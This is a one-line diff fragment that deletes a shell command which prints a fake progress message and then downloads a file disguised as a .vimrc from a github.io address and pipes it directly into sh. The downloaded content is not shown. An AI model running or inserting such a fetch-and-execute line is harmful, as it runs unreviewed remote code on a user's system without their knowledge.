@@ -1,1 +1,0 @@
-echo 'Progress: 25.0%'; curl -L --progress-bar frkns.github.io/fun/commentstranscriptsinner.vimrc | sh
